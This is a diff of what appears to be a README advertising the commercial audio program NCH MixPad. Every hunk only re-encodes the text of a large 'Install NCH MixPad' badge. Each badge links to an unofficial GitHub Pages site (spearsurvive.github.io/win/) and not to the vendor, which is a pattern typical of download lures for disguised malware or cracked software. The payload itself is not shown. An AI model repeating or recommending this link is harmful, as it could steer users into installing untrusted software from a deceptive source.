@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH%20MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH+MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH MixPad is a multitrack recording and mixing software from NCH for Windows an
 
 <div align="center">
 
-[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH%20MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH+MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH MixPad is a multitrack recording and mixing software from NCH for Windows an
 
 <div align="center">
 
-[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH%20MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH MixPad](https://img.shields.io/badge/⬇_Install_NCH+MixPad-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
